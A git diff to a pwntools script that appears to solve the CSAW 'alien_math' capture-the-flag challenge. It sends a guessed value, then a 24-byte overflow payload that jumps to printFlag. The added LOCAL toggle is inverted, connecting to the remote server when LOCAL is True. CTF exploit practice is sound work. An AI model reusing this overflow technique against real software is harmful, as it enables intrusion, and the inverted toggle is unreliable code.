@@ -3,6 +3,7 @@
 from socket import recv_fds
 from pwn import *
 
+LOCAL = False
 context.binary = binary = '/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math'
 math_elf = ELF(binary)
 context.log_level = 'debug'
@@ -11,9 +12,10 @@ OFFSET = 24
 junk = b"A" * OFFSET
 
 while True:
-    p = remote('pwn.chal.csaw.io', 5004, ssl=False)
-    #p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math')
-
+    if LOCAL == True:
+        p = remote('pwn.chal.csaw.io', 5004, ssl=False)
+    else:
+        p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math')
     guess1 = b"1804289383"
     p.sendlineafter("What is the square root of zopnol?", guess1)
     leak = p.recvuntil("!\n")
@@ -27,12 +29,14 @@ while True:
         log.info(f"{leak = }")
         if b"\nGenius!" in leak:
             False
+            
             payload = [
                 junk,
                 printFlag,
             ]
 
             payload = b''.join(payload)
+            #payload = b''.join([p64(r) for r in payload])
             p.sendline(payload)
             p.interactive()
         else:
